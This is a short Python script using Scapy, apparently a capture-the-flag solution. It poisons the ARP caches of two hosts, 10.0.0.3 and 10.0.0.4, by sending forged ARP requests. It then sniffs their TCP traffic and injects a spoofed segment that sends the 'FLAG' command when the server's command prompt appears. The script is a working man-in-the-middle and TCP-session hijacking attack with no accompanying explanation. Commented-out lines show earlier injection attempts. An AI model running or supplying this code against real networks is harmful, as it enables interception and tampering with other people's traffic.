from scapy.all import *
eth = Ether(dst="ff:ff:ff:ff:ff:ff")
arp = ARP(op=1, psrc="10.0.0.3", pdst="10.0.0.4", hwdst="ff:ff:ff:ff:ff:ff")
arp_pkt = eth/arp
sendp(arp_pkt, iface="eth0")
arp = ARP(op=1, psrc="10.0.0.4", pdst="10.0.0.3", hwdst="ff:ff:ff:ff:ff:ff")
arp_pkt = eth/arp
sendp(arp_pkt, iface="eth0")

def send_packet(packet):
	if Raw in packet and TCP in packet:
		data = packet[Raw].load.decode()
		if data == "COMMANDS:\nECHO\nFLAG\nCOMMAND:\n":
			eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
			ip = IP(src=packet[IP].dst, dst=packet[IP].src)
			tcp = TCP(sport=packet[TCP].dport, dport=packet[TCP].sport,
				  seq=packet[TCP].ack, ack=packet[TCP].seq + len(data), flags="PA")
			send_ack = eth/ip/tcp/b"FLAG\n"
			sendp(send_ack, iface="eth0")
#	ip = IP(src="10.0.0.4", dst="10.0.0.3")
#	tcp = TCP(flags="A", dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].ack, ack=packet[TCP].seq)
#	send_ack = eth/ip/tcp
#	sendp(send_ack, iface="eth0")
#	tcp = TCP(flags="A", dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].ack, ack=packet[TCP].seq)
#	send_psh_ack = eth/ip/tcp/"FLAG\n"
#	sendp(send_psh_ack, iface="eth0")

sniff(iface="eth0", filter="tcp", prn=send_packet, store=0)
